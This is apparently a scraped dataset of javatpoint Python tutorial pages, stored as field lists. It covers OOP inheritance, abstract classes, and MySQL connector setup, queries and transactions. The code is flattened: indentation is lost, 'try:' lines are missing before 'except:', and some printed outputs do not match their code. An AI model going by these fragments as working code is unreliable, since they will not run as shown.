'print(issubclass(Calculation1,Calculation2))', 'class Calculation1:', 'def Summation(self,a,b):', 'return a+b;', 'class Calculation2:', 'def Multiplication(self,a,b):', 'return a*b;', 'class Derived(Calculation1,Calculation2):', 'def Divide(self,a,b):', 'return a/b;', 'd = Derived()', 'print(isinstance(d,Derived))', 'class Animal:', 'def speak(self):', 'print(""speaking"")', 'class Dog(Animal):', 'def speak(self):', 'print(""Barking"")', 'd = Dog()', 'd.speak()', 'class Bank:', 'def getroi(self):', 'return 10;', 'class SBI(Bank):', 'def getroi(self):', 'return 7;', 'class ICICI(Bank):', 'def getroi(self):', 'return 8;', 'b1 = Bank()', 'b2 = SBI()', 'b3 = ICICI()', 'print(""Bank Rate of interest:"",b1.getroi());', 'print(""SBI Rate of interest:"",b2.getroi());', 'print(""ICICI Rate of interest:"",b3.getroi());', 'class Employee:', '__count = 0;', 'def __init__(self):', 'Employee.__count = Employee.__count+1', 'def display(self):', 'print(""The number of employees"",Employee.__count)', 'emp = Employee()', 'emp2 = Employee()', 'print(emp.__count)', 'finally:', 'emp.display()']","['dog barking', 'Animal Speaking', 'dog barking', 'Animal Speaking', 'Eating bread...', '30', '200', '0.5', 'True', 'False', 'True', 'Barking', 'Bank Rate of interest: 10', 'SBI Rate of interest: 7', 'ICICI Rate of interest: 8', 'The number of employees 2', ""AttributeError: 'Employee' object has no attribute '__count'""]",[],[]
72,['Abstraction in Python'],"['Abstraction is used to hide the internal functionality of the function from the users. The users only interact with the basic implementation of the function, but inner working is hidden. User is familiar with that ""what function does"" but they don\'t know ""how it does.""']","['https://www.javatpoint.com/python-mysql-environment-setup', 'https://www.javatpoint.com/inheritance-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/python-oops-concepts', 'https://www.javatpoint.com/https://www.javatpoint.com/python-programs', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/python-mysql-environment-setup', 'https://www.javatpoint.com/inheritance-in-python', 'https://www.javatpoint.com/python-mysql-environment-setup']",[],[],"['Why Abstraction is Important?', 'Abstraction classes in Python', 'Abstract Base Classes', 'Working of the Abstract Classes', 'Points to Remember']",[],[],"['That is exactly the abstraction that works in the object-oriented concept.', 'In Python, abstraction can be achieved by using abstract classes and interfaces.', 'We import the ABC class from the abc module.', 'Explanation -', ""Let's understand another example."", ""Let's understand another example."", 'Explanation -', 'Below are the points which we should remember about the abstract base class in Python.', 'Abstraction is essential to hide the core functionality from the users. We have covered the all the basic concepts of Abstraction in Python.']","['In Python, an abstraction is used to hide the irrelevant data/class in order to reduce the complexity. It also enhances the application efficiency. Next, we will learn how we can achieve abstraction using the Python program.']","['In simple words, we all use the smartphone and very much familiar with its functions such as camera, voice-recorder, call-dialing, etc., but we don\'t know how these operations are happening in the background. Let\'s take another example - When we use the TV remote to increase the volume. We don\'t know how pressing a key increases the volume of the TV. We only know to press the ""+"" button to increase the volume.', ""A class that consists of one or more abstract method is called the abstract class. Abstract methods do not contain their implementation. Abstract class can be inherited by the subclass and abstract method gets its definition in the subclass. Abstraction classes are meant to be the blueprint of the other class. An abstract class can be useful when we are designing large functions. An abstract class is also helpful to provide the standard interface for different implementations of components. Python provides the abc module to use the abstraction in the Python program. Let's see the following syntax."", 'An abstract base class is the common application program of the interface for a set of subclasses. It can be used by the third-party, which will provide the implementations such as with plugins. It is also beneficial when we work with the large code-base hard to remember all the classes.', ""Unlike the other high-level language, Python doesn't provide the abstract class itself. We need to import the abc module, which provides the base for defining Abstract Base classes (ABC). The ABC works by decorating methods of the base class as abstract. It registers concrete classes as the implementation of the abstract base. We use the @abstractmethod decorator to define an abstract method or if we don't provide the definition to the method, it automatically becomes the abstract method. Let's understand the following example."", 'In the above code, we have imported the abc module to create the abstract base class. We created the Car class that inherited the ABC class and defined an abstract method named mileage(). We have then inherited the base class from the three different subclasses and implemented the abstract method differently. We created the objects to call the abstract method.', 'In the above code, we have defined the abstract base class named Polygon and we also defined the abstract method. This base class inherited by the various subclasses. We implemented the abstract method in each subclass. We created the object of the subclasses and invoke the sides() method. The hidden implementations for the sides() method inside the each subclass comes into play. The abstract method sides() method, defined in the abstract class, is never invoked.']","['from abc import ABC', 'class ClassName(ABC):', '# Python program demonstrate', '# abstract base class work', 'from abc import ABC, abstractmethod', 'class Car(ABC):', 'def mileage(self):', 'class Tesla(Car):', 'def mileage(self):', 'print(""The mileage is 30kmph"")', 'class Suzuki(Car):', 'def mileage(self):', 'print(""The mileage is 25kmph "")', 'class Duster(Car):', 'def mileage(self):', 'print(""The mileage is 24kmph "")', 'class Renault(Car):', 'def mileage(self):', 'print(""The mileage is 27kmph "")', '# Driver code', 't= Tesla ()', 't.mileage()', 'r = Renault()', 'r.mileage()', 's = Suzuki()', 's.mileage()', 'd = Duster()', 'd.mileage()', '# Python program to define', '# abstract class', 'from abc import ABC', 'class Polygon(ABC):', '# abstract method', 'def sides(self):', 'pass', 'class Triangle(Polygon):', 'def sides(self):', 'print(""Triangle has 3 sides"")', 'class Pentagon(Polygon):', 'def sides(self):', 'print(""Pentagon has 5 sides"")', 'class Hexagon(Polygon):', 'def sides(self):', 'print(""Hexagon has 6 sides"")', 'class square(Polygon):', 'def sides(self):', 'print(""I have 4 sides"")', '# Driver code', 't = Triangle()', 't.sides()', 's = square()', 's.sides()', 'p = Pentagon()', 'p.sides()', 'k = Hexagon()', 'K.sides()']","['The mileage is 30kmph', 'The mileage is 27kmph', 'The mileage is 25kmph', 'The mileage is 24kmph', 'Triangle has 3 sides', 'Square has 4 sides', 'Pentagon has 5 sides', 'Hexagon has 6 sides']",[],['|||An Abstract class can contain the both method normal and abstract method.|||An Abstract cannot be instantiated; we cannot create objects for the abstract class.|||']
73,['Environment Setup'],"['To build the real world applications, connecting with the databases is the necessity for the programming languages. However, python allows us to connect our application to the databases like MySQL, SQLite, MongoDB, and many others. ']","['https://www.javatpoint.com/python-mysql-database-connection', 'https://www.javatpoint.com/abstraction-in-python', 'https://www.javatpoint.com/https://files.pythonhosted.org/packages/8f/6d/fb8ebcbbaee68b172ce3dfd08c7b8660d09f91d8d5411298bcacbd309f96/mysql-connector-python-8.0.13.tar.gz', 'https://www.javatpoint.com/python-mysql-database-connection', 'https://www.javatpoint.com/abstraction-in-python', 'https://www.javatpoint.com/python-mysql-database-connection']",['https://static.javatpoint.com/python/images/environment-setup.png'],[],['Install mysql.connector'],[],[],"['To connect the python application with the MySQL database, we must import the mysql.connector module in the program. ', 'The mysql.connector is not a built-in module that comes with the python installation. We need to install it to get it working. ', 'Execute the following command to install it using pip installer.', 'Or follow the following steps.', '1. Click the link:', '2. Extract the archived file.', '3. Open the terminal (CMD for windows) and change the present working directory to the source code directory.', '4. Run the file named setup.py with python (python3 in case you have also installed python 2) with the parameter build.', '5. Run the following command to install the mysql-connector.', 'Hence, we have successfully installed mysql-connector for python on our system.']","['In this section of the tutorial, we will discuss Python - MySQL connectivity, and we will perform the database operations in python. We will also cover the Python connectivity with the databases like MongoDB and SQLite later in this tutorial.', 'https://files.pythonhosted.org/packages/8f/6d/fb8ebcbbaee68b172ce3dfd08c7b8660d09f91d8d5411298bcacbd309f96/mysql-connector-python-8.0.13.tar.gz to download the source code.', 'This will take a bit of time to install mysql-connector for python. We can verify the installation once the process gets over by importing mysql-connector on the python shell.']",[],"['>  python -m pip install mysql-connector', '$  cd mysql-connector-python-8.0.13/', '$ python setup.py build', '$ python setup.py install']",[],[],[]
74,['Database Connection'],"['In this section of the tutorial, we will discuss the steps to connect the python application to the database. ']","['https://www.javatpoint.com/python-mysql-creating-new-database', 'https://www.javatpoint.com/python-mysql-environment-setup', 'https://www.javatpoint.com/python-mysql-creating-new-database', 'https://www.javatpoint.com/python-mysql-environment-setup', 'https://www.javatpoint.com/python-mysql-creating-new-database']",[],[],"['Creating the connection', 'Creating a cursor object']","['Example', 'Example', 'Example']",[],"['There are the following steps to connect a python application to our database.', 'To create a connection between the MySQL database and the python application, the connect() method of mysql.connector module is used. ', 'Pass the database details like HostName, username, and the database password in the method call. The method returns the connection object. ', 'The syntax to use the connect() is given below.', 'Consider the following example.', 'Here, we must notice that we can specify the database name in the connect() method if we want to connect to a specific database.', 'The syntax to create the cursor object is given below.']",[],"[""The cursor object can be defined as an abstraction specified in the Python DB-API 2.0. It facilitates us to have multiple separate working environments through the same connection to the database. We can create the cursor object by calling the 'cursor' function of the connection object. The cursor object is an important aspect of executing queries to the databases. ""]","['Connection-Object= mysql.connector.connect(host = <host-name> , user = <username> , passwd = <password> )', 'import mysql.connector', '#Create the connection object', 'myconn = mysql.connector.connect(host = ""localhost"", user = ""root"",passwd = ""google"")', '#printing the connection object', 'print(myconn)', 'import mysql.connector', '#Create the connection object', 'myconn = mysql.connector.connect(host = ""localhost"", user = ""root"",passwd = ""google"", database = ""mydb"")', '#printing the connection object', 'print(myconn)', '<my_cur>  = conn.cursor()', 'import mysql.connector', '#Create the connection object', 'myconn = mysql.connector.connect(host = ""localhost"", user = ""root"",passwd = ""google"", database = ""mydb"")', '#printing the connection object', 'print(myconn)', '#creating the cursor object', 'cur = myconn.cursor()', 'print(cur)']","['<mysql.connector.connection.MySQLConnection object at 0x7fb142edd780>', '<mysql.connector.connection.MySQLConnection object at 0x7ff64aa3d7b8>', '<mysql.connector.connection.MySQLConnection object at 0x7faa17a15748>', 'MySQLCursor: (Nothing executed yet)']",[],['|||Import mysql.connector module|||Create the connection object. |||Create the cursor object|||Execute the query|||']
75,['Creating new databases'],"['In this section of the tutorial, we will create the new database PythonDB.']","['https://www.javatpoint.com/python-mysql-creating-tables', 'https://www.javatpoint.com/python-mysql-database-connection', 'https://www.javatpoint.com/python-mysql-creating-tables', 'https://www.javatpoint.com/python-mysql-database-connection', 'https://www.javatpoint.com/python-mysql-creating-tables']",[],[],"['Getting the list of existing databases ', 'Creating the new database']","['Example', 'Example']",[],"['We can get the list of all the databases by using the following MySQL query.', 'The new database can be created by using the following SQL query.']",[],[],"['>  show databases;', 'import mysql.connector', '#Create the connection object', 'myconn = mysql.connector.connect(host = ""localhost"", user = ""root"",passwd = ""google"")', '#creating the cursor object', 'cur = myconn.cursor()', 'dbs = cur.execute(""show databases"")', 'except:', 'myconn.rollback()', 'for x in cur:', 'print(x)', 'myconn.close()', '>  create database <database-name>', 'import mysql.connector', '#Create the connection object', 'myconn = mysql.connector.connect(host = ""localhost"", user = ""root"",passwd = ""google"")', '#creating the cursor object', 'cur = myconn.cursor()', '#creating a new database', 'cur.execute(""create database PythonDB2"")', '#getting the list of all the databases which will now include the new database PythonDB', 'dbs = cur.execute(""show databases"")', 'except:', 'myconn.rollback()', 'for x in cur:', 'print(x)', '', 'myconn.close()']","[""('EmployeeDB',)"", ""('Test',)"", ""('TestDB',)"", ""('information_schema',)"", ""('javatpoint',)"", ""('javatpoint1',)"", ""('mydb',)"", ""('mysql',)"", ""('performance_schema',)"", ""('testDB',)"", ""('EmployeeDB',)"", ""('PythonDB',)"", ""('Test',)"", ""('TestDB',)"", ""('anshika',)"", ""('information_schema',)"", ""('javatpoint',)"", ""('javatpoint1',)"", ""('mydb',)"", ""('mydb1',)"", ""('mysql',)"", ""('performance_schema',)"", ""('testDB',)""]",[],[]
76,['Creating the table'],"['In this section of the tutorial, we will create the new table Employee. We have to mention the database name while establishing the connection object. ']","['https://www.javatpoint.com/python-mysql-insert-operation', 'https://www.javatpoint.com/python-mysql-creating-new-database', 'https://www.javatpoint.com/python-mysql-insert-operation', 'https://www.javatpoint.com/python-mysql-creating-new-database', 'https://www.javatpoint.com/python-mysql-insert-operation']","['https://static.javatpoint.com/python/images/creating-the-table.png', 'https://static.javatpoint.com/python/images/creating-the-table2.png']",[],['Alter Table'],"['Example', 'Example']",[],"['The following query is used to create the new table Employee.', 'Now, we may check that the table Employee is present in the database.', 'Consider the following example.']","['We can create the new table by using the CREATE TABLE statement of SQL. In our database PythonDB, the table Employee will have the four columns, i.e., name, id, salary, and department_id initially.']","['Sometimes, we may forget to create some columns, or we may need to update the table schema. The alter statement used to alter the table schema if required. Here, we will add the column branch_name to the table Employee. The following SQL query is used for this purpose.']","['>  create table Employee (name varchar(20) not null, id int primary key, salary float not null, Dept_Id int not null)', 'import mysql.connector', '#Create the connection object', 'myconn = mysql.connector.connect(host = ""localhost"", user = ""root"",passwd = ""google"",database = ""PythonDB"")', '#creating the cursor object', 'cur = myconn.cursor()', '#Creating a table with name Employee having four columns i.e., name, id, salary, and department id', 'dbs = cur.execute(""create table Employee(name varchar(20) not null, id int(20) not null primary key, salary float not null, Dept_id int not null)"")', 'except:', 'myconn.rollback()', 'myconn.close()', 'alter table Employee add branch_name varchar(20) not null', 'import mysql.connector', '#Create the connection object', 'myconn = mysql.connector.connect(host = ""localhost"", user = ""root"",passwd = ""google"",database = ""PythonDB"")', '#creating the cursor object', 'cur = myconn.cursor()', '#adding a column branch name to the table Employee', 'cur.execute(""alter table Employee add branch_name varchar(20) not null"")', 'except:', 'myconn.rollback()', 'myconn.close()']",[],[],[]
77,['Insert Operation'],"['The INSERT INTO statement is used to add a record to the table. In python, we can mention the format specifier (%s) in place of values. ']","['https://www.javatpoint.com/python-mysql-read-operation', 'https://www.javatpoint.com/python-mysql-creating-tables', 'https://www.javatpoint.com/python-mysql-read-operation', 'https://www.javatpoint.com/python-mysql-creating-tables', 'https://www.javatpoint.com/python-mysql-read-operation']","['https://static.javatpoint.com/python/images/insert-operation.png', 'https://static.javatpoint.com/python/images/insert-operation2.png']",[],"['Adding a record to the table', 'Insert multiple rows', 'Row ID']","['Example', 'Example', 'Example']",[],"['We provide the actual values in the form of tuple in the execute() method of the cursor. ', 'Consider the following example.', 'We can also insert multiple rows at once using the python script. The multiple rows are mentioned as the list of various tuples.', 'Each element of the list is treated as one particular row, whereas each element of the tuple is treated as one particular column value (attribute).', 'Consider the following example.', 'Consider the following example.']","['In SQL, a particular row is represented by an insertion id which is known as row id. We can get the last inserted row id by using the attribute lastrowid of the cursor object.']",[],"['import mysql.connector', '#Create the connection object', 'myconn = mysql.connector.connect(host = ""localhost"", user = ""root"",passwd = ""google"",database = ""PythonDB"")', '#creating the cursor object', 'cur = myconn.cursor()', 'sql = ""insert into Employee(name, id, salary, dept_id, branch_name) values (%s, %s, %s, %s, %s)""', '#The row values are provided in the form of tuple', 'val = (""John"", 110, 25000.00, 201, ""Newyork"")', '#inserting the values into the table', 'cur.execute(sql,val)', '#commit the transaction', 'myconn.commit()', 'except:', 'myconn.rollback()', 'print(cur.rowcount,""record inserted!"")', 'myconn.close()', 'import mysql.connector', '#Create the connection object', 'myconn = mysql.connector.connect(host = ""localhost"", user = ""root"",passwd = ""google"",database = ""PythonDB"")', '#creating the cursor object', 'cur = myconn.cursor()', 'sql = ""insert into Employee(name, id, salary, dept_id, branch_name) values (%s, %s, %s, %s, %s)""', 'val = [(""John"", 102, 25000.00, 201, ""Newyork""),(""David"",103,25000.00,202,""Port of spain""),(""Nick"",104,90000.00,201,""Newyork"")]', '#inserting the values into the table', 'cur.executemany(sql,val)', '#commit the transaction', 'myconn.commit()', 'print(cur.rowcount,""records inserted!"")', 'except:', 'myconn.rollback()', 'myconn.close()', 'import mysql.connector', '#Create the connection object', 'myconn = mysql.connector.connect(host = ""localhost"", user = ""root"",passwd = ""google"",database = ""PythonDB"")', '#creating the cursor object', 'cur = myconn.cursor()', 'sql = ""insert into Employee(name, id, salary, dept_id, branch_name) values (%s, %s, %s, %s, %s)""', 'val = (""Mike"",105,28000,202,""Guyana"")', '#inserting the values into the table', 'cur.execute(sql,val)', '#commit the transaction', 'myconn.commit()', '#getting rowid', 'print(cur.rowcount,""record inserted! id:"",cur.lastrowid)', 'except:', 'myconn.rollback()', 'myconn.close()']","['1 record inserted!', '3 records inserted!', '1 record inserted! Id: 0']",[],[]
78,['Read Operation'],"['The SELECT statement is used to read the values from the databases. We can restrict the output of a select query by using various clause in SQL like where, limit, etc. ']","['https://www.javatpoint.com/python-mysql-update-operation', 'https://www.javatpoint.com/python-mysql-insert-operation', 'https://www.javatpoint.com/python-mysql-update-operation', 'https://www.javatpoint.com/python-mysql-insert-operation', 'https://www.javatpoint.com/python-mysql-update-operation']",[],[],"['Reading specific columns', 'The fetchone() method', 'Formatting the result', 'Using where clause', 'Ordering the result', 'Order by DESC']","['Example', 'Example', 'Example', 'Example', 'Example: printing the names that start with j', 'Example: printing the names with id = 101, 102, and 103', 'Example', 'Example']",[],"['We can read the specific columns by mentioning their names instead of using star (*).', 'In the following example, we will read the name, id, and salary from the Employee table and print it on the console.', 'The fetchone() method is used to fetch only one row from the table. The fetchone() method returns the next row of the result-set. ', 'Consider the following example.', 'Consider the following example.', 'Consider the following example.', 'The ORDER BY clause is used to order the result. Consider the following example.', 'This orders the result in the decreasing order of a particular column.']","['Python provides the fetchall() method returns the data stored inside the table in the form of rows. We can iterate the result to get the individual rows.', 'In this section of the tutorial, we will extract the data from the database by using the python script. We will also format the output to print it on the console.', 'We can format the result by iterating over the result produced by the fetchall() or fetchone() method of cursor object since the result exists as the tuple object which is not readable.', 'We can restrict the result produced by the select statement by using the where clause. This will extract only those columns which satisfy the where condition. ']",[],"['import mysql.connector', '#Create the connection object', 'myconn = mysql.connector.connect(host = ""localhost"", user = ""root"",passwd = ""google"",database = ""PythonDB"")', '#creating the cursor object', 'cur = myconn.cursor()', '#Reading the Employee data', 'cur.execute(""select * from Employee"")', '#fetching the rows from the cursor object', 'result = cur.fetchall()', '#printing the result', 'for x in result:', 'print(x);', 'except:', 'myconn.rollback()', 'myconn.close()', 'import mysql.connector', '#Create the connection object', 'myconn = mysql.connector.connect(host = ""localhost"", user = ""root"",passwd = ""google"",database = ""PythonDB"")', '#creating the cursor object', 'cur = myconn.cursor()', '#Reading the Employee data', 'cur.execute(""select name, id, salary from Employee"")', '#fetching the rows from the cursor object', 'result = cur.fetchall()', '#printing the result', 'for x in result:', 'print(x);', 'except:', 'myconn.rollback()', 'myconn.close()', 'import mysql.connector', '#Create the connection object', 'myconn = mysql.connector.connect(host = ""localhost"", user = ""root"",passwd = ""google"",database = ""PythonDB"")', '#creating the cursor object', 'cur = myconn.cursor()', '#Reading the Employee data', 'cur.execute(""select name, id, salary from Employee"")', '#fetching the first row from the cursor object', 'result = cur.fetchone()', '#printing the result', 'print(result)', 'except:', 'myconn.rollback()', 'myconn.close()', 'import mysql.connector', '#Create the connection object', 'myconn = mysql.connector.connect(host = ""localhost"", user = ""root"",passwd = ""google"",database = ""PythonDB"")', '#creating the cursor object', 'cur = myconn.cursor()', '#Reading the Employee data', 'cur.execute(""select name, id, salary from Employee"")', '#fetching the rows from the cursor object', 'result = cur.fetchall()', 'print(""Name    id    Salary"");', 'for row in result:', 'print(""%s    %d    %d""%(row[0],row[1],row[2]))', 'except:', 'myconn.rollback()', 'myconn.close()', 'import mysql.connector', '#Create the connection object', 'myconn = mysql.connector.connect(host = ""localhost"", user = ""root"",passwd = ""google"",database = ""PythonDB"")', '#creating the cursor object', 'cur = myconn.cursor()', '#Reading the Employee data', 'cur.execute(""select name, id, salary from Employee where name like \'J%\'"")', '#fetching the rows from the cursor object', 'result = cur.fetchall()', 'print(""Name    id    Salary"");', 'for row in result:', 'print(""%s    %d    %d""%(row[0],row[1],row[2]))', 'except:', 'myconn.rollback()', 'myconn.close()', 'import mysql.connector', '#Create the connection object', 'myconn = mysql.connector.connect(host = ""localhost"", user = ""root"",passwd = ""google"",database = ""PythonDB"")', '#creating the cursor object', 'cur = myconn.cursor()', '#Reading the Employee data', 'cur.execute(""select name, id, salary from Employee where id in (101,102,103)"")', '#fetching the rows from the cursor object', 'result = cur.fetchall()', 'print(""Name    id    Salary"");', 'for row in result:', 'print(""%s    %d    %d""%(row[0],row[1],row[2]))', 'except:', 'myconn.rollback()', 'myconn.close()', 'import mysql.connector', '#Create the connection object', 'myconn = mysql.connector.connect(host = ""localhost"", user = ""root"",passwd = ""google"",database = ""PythonDB"")', '#creating the cursor object', 'cur = myconn.cursor()', '#Reading the Employee data', 'cur.execute(""select name, id, salary from Employee order by name"")', '#fetching the rows from the cursor object', 'result = cur.fetchall()', 'print(""Name    id    Salary"");', 'for row in result:', 'print(""%s    %d    %d""%(row[0],row[1],row[2]))', 'except:', 'myconn.rollback()', 'myconn.close()', 'import mysql.connector', '#Create the connection object', 'myconn = mysql.connector.connect(host = ""localhost"", user = ""root"",passwd = ""google"",database = ""PythonDB"")', '#creating the cursor object', 'cur = myconn.cursor()', '#Reading the Employee data', 'cur.execute(""select name, id, salary from Employee order by name desc"")', '#fetching the rows from the cursor object', 'result = cur.fetchall()', '#printing the result', 'print(""Name    id    Salary"");', 'for row in result:', 'print(""%s    %d    %d""%(row[0],row[1],row[2]))', 'except:', 'myconn.rollback()', 'myconn.close()']","[""('John', 101, 25000.0, 201, 'Newyork')"", ""('John', 102, 25000.0, 201, 'Newyork')"", ""('David', 103, 25000.0, 202, 'Port of spain')"", ""('Nick', 104, 90000.0, 201, 'Newyork')"", ""('Mike', 105, 28000.0, 202, 'Guyana')"", ""('John', 101, 25000.0)"", ""('John', 102, 25000.0)"", ""('David', 103, 25000.0)"", ""('Nick', 104, 90000.0)"", ""('Mike', 105, 28000.0)"", ""('John', 101, 25000.0)"", 'Name    id    Salary', 'John    101    25000', 'John    102    25000', 'David    103    25000', 'Nick    104    90000', 'Mike    105    28000', 'Name    id    Salary', 'John    101    25000', 'John    102    25000', 'Name    id    Salary', 'John    101    25000', 'John    102    25000', 'David    103    2500', 'Name    id    Salary', 'David   103    25000', 'John    101    25000', 'John    102    25000', 'Mike    105    28000', 'Nick    104    90000', 'Name    id    Salary', 'Nick    104    90000', 'Mike    105    28000', 'John    101    25000', 'John    102    25000', 'David    103    25000']",[],[]
79,['Update Operation'],['The UPDATE-SET statement is used to update any column inside the table. The following SQL query is used to update a column. '],"['https://www.javatpoint.com/python-mysql-join-operation', 'https://www.javatpoint.com/python-mysql-read-operation', 'https://www.javatpoint.com/python-mysql-join-operation', 'https://www.javatpoint.com/python-mysql-read-operation', 'https://www.javatpoint.com/python-mysql-join-operation']",['https://static.javatpoint.com/python/images/update-operation.png'],[],['Delete Operation'],"['Example', 'Example']",[],"['Consider the following example.', 'The following SQL query is used to delete the employee detail whose id is 110 from the table.', 'Consider the following example.']","['The DELETE FROM statement is used to delete a specific record from the table. Here, we must impose a condition using WHERE clause otherwise all the records from the table will be removed. ']",[],"["">  update Employee set name = 'alex' where id = 110"", 'import mysql.connector', '#Create the connection object', 'myconn = mysql.connector.connect(host = ""localhost"", user = ""root"",passwd = ""google"",database = ""PythonDB"")', '#creating the cursor object', 'cur = myconn.cursor()', '#updating the name of the employee whose id is 110', 'cur.execute(""update Employee set name = \'alex\' where id = 110"")', 'myconn.commit()', 'except:', 'myconn.rollback()', 'myconn.close()', '>  delete from Employee where id = 110', 'import mysql.connector', '#Create the connection object', 'myconn = mysql.connector.connect(host = ""localhost"", user = ""root"",passwd = ""google"",database = ""PythonDB"")', '#creating the cursor object', 'cur = myconn.cursor()', '#Deleting the employee details whose id is 110', 'cur.execute(""delete from Employee where id = 110"")', 'myconn.commit()', 'except:', 'myconn.rollback()', 'myconn.close()']",[],[],[]
80,['Join Operation'],['We can combine the columns from two or more tables by using some common column among them by using the join statement. '],"['https://www.javatpoint.com/python-mysql-performing-transactions', 'https://www.javatpoint.com/python-mysql-update-operation', 'https://www.javatpoint.com/python-mysql-performing-transactions', 'https://www.javatpoint.com/python-mysql-update-operation', 'https://www.javatpoint.com/python-mysql-performing-transactions']","['https://static.javatpoint.com/python/images/join-operation.png', 'https://static.javatpoint.com/python/images/join-operation2.png']",[],"['Right Join', 'Left Join']","['Example', 'Example', 'Example']",[],"[""We have only one table in our database, let's create one more table Departments with two columns department_id and department_name."", ""As we have created a new table Departments as shown in the above image. However, we haven't yet inserted any value inside it. "", ""Let's insert some Departments ids and departments names so that we can map this to our Employee table."", ""Let's look at the values inserted in each of the tables. Consider the following image."", ""Now, let's create a python script that joins the two tables on the common column, i.e., dept_id. "", 'Execute the following query on the MySQL server.', ""This will insert an employee Alex who doesn't work for any department (department id is null). "", 'The left join covers all the data from the left-hand side table. It has just opposite effect to the right join. Consider the following example.']","[""Now, we have an employee in the Employee table whose department id is not present in the Departments table. Let's perform the right join on the two tables now.""]","[""Right join shows all the columns of the right-hand side table as we have two tables in the database PythonDB, i.e., Departments and Employee. We do not have any Employee in the table who is not working for any department (Employee for which department id is null). However, to understand the concept of right join let's create the one. ""]","['create table Departments (Dept_id int(20) primary key not null, Dept_Name varchar(20) not null);', 'insert into Departments values (201, ""CS"");', 'insert into Departments values (202, ""IT"");', 'import mysql.connector', '#Create the connection object', 'myconn = mysql.connector.connect(host = ""localhost"", user = ""root"",passwd = ""google"",database = ""PythonDB"")', '#creating the cursor object', 'cur = myconn.cursor()', '#joining the two tables on departments_id', 'cur.execute(""select Employee.id, Employee.name, Employee.salary, Departments.Dept_id, Departments.Dept_Name from Departments join Employee on Departments.Dept_id = Employee.Dept_id"")', 'print(""ID    Name    Salary    Dept_Id    Dept_Name"")', 'for row in cur:', 'print(""%d    %s    %d    %d    %s""%(row[0], row[1],row[2],row[3],row[4]))', '', 'except:', 'myconn.rollback()', 'myconn.close()', 'insert into Employee(name, id, salary, branch_name) values (""Alex"",108,29900,""Mumbai"");', 'import mysql.connector', '#Create the connection object', 'myconn = mysql.connector.connect(host = ""localhost"", user = ""root"",passwd = ""google"",database = ""PythonDB"")', '#creating the cursor object', 'cur = myconn.cursor()', '#joining the two tables on departments_id', 'result = cur.execute(""select Employee.id, Employee.name, Employee.salary, Departments.Dept_id, Departments.Dept_Name from Departments right join Employee on Departments.Dept_id = Employee.Dept_id"")', 'print(""ID    Name    Salary    Dept_Id    Dept_Name"")', 'for row in cur:', 'print(row[0],""    "", row[1],""    "",row[2],""    "",row[3],""    "",row[4])', '', 'except:', 'myconn.rollback()', 'myconn.close()', 'import mysql.connector', '#Create the connection object', 'myconn = mysql.connector.connect(host = ""localhost"", user = ""root"",passwd = ""google"",database = ""PythonDB"")', '#creating the cursor object', 'cur = myconn.cursor()', '#joining the two tables on departments_id', 'result = cur.execute(""select Employee.id, Employee.name, Employee.salary, Departments.Dept_id, Departments.Dept_Name from Departments left join Employee on Departments.Dept_id = Employee.Dept_id"")', 'print(""ID    Name    Salary    Dept_Id    Dept_Name"")', 'for row in cur:', 'print(row[0],""    "", row[1],""    "",row[2],""    "",row[3],""    "",row[4])', '', 'except:', 'myconn.rollback()', 'myconn.close()']","['ID    Name    Salary    Dept_Id    Dept_Name', '101   John    25000    \t201    \t\tCS', '102   John    25000    \t201    \t\tCS', '103   David   25000       202    \t\tIT', '104   Nick    90000   \t201    \t\tCS', '105   Mike    28000   \t202   \t\tIT', 'ID    Name    Salary    Dept_Id    Dept_Name', '101      John      25000.0      201      CS', '102      John      25000.0      201      CS', '103      David      25000.0      202      IT', '104      Nick      90000.0      201      CS', '105      Mike      28000.0      202      IT', '108      Alex      29900.0      None      None', 'ID    Name    Salary    Dept_Id    Dept_Name', '101      John      25000.0      201      CS', '102      John      25000.0      201      CS', '103      David      25000.0      202      IT', '104      Nick      90000.0      201      CS', '105      Mike      28000.0      202      IT']",[],[]
81,['Performing Transactions'],['Transactions ensure the data consistency of the database. We have to make sure that more than one applications must not modify the records while performing the database operations. The transactions have the following properties.'],"['https://www.javatpoint.com/python-tkinter', 'https://www.javatpoint.com/python-mysql-join-operation', 'https://www.javatpoint.com/python-tkinter', 'https://www.javatpoint.com/python-mysql-join-operation', 'https://www.javatpoint.com/python-tkinter']",[],[],"['Python commit() method', 'Python rollback() method', 'Closing the connection']",['Example'],[],"['Python provides the commit() method which ensures the changes made to', 'the database consistently take place.', 'The syntax to use the commit() method is given below.', 'All the operations that modify the records of the database do not take place until the commit() is called.', 'The syntax to use the rollback() is given below.', 'In the following example, we are deleting all the employees who are working for the CS department.']","['The rollback() method is used to revert the changes that are done to the database. This method is useful in the sense that, if some error occurs during the database operations, we can rollback that transaction to maintain the database consistency. ', 'We need to close the database connection once we have done all the operations regarding the database. Python provides the close() method. The syntax to use the close() method is given below.']",[],"['conn.commit() #conn is the connection object', 'Conn.rollback()', 'conn.close()', 'import mysql.connector', '#Create the connection object', 'myconn = mysql.connector.connect(host = ""localhost"", user = ""root"",passwd = ""google"",database = ""PythonDB"")', '#creating the cursor object', 'cur = myconn.cursor()', 'cur.execute(""delete from Employee where Dept_id = 201"")', 'myconn.commit()', 'print(""Deleted !"")', 'except:', 'print(""Can\'t delete !"")', 'myconn.rollback()', 'myconn.close()']",['Deleted !'],[],"['|||Atomicity|||Either the transaction completes, or nothing happens. If a transaction contains 4 queries then all these queries must be executed, or none of them must be executed.|||Consistency|||The database must be consistent before the transaction starts and the database must also be consistent after the transaction is completed. |||Isolation |||Intermediate results of a transaction are not visible outside the|||current transaction.|||Durability |||Once a transaction was committed, the effects are persistent,|||even after a system failure.|||']"
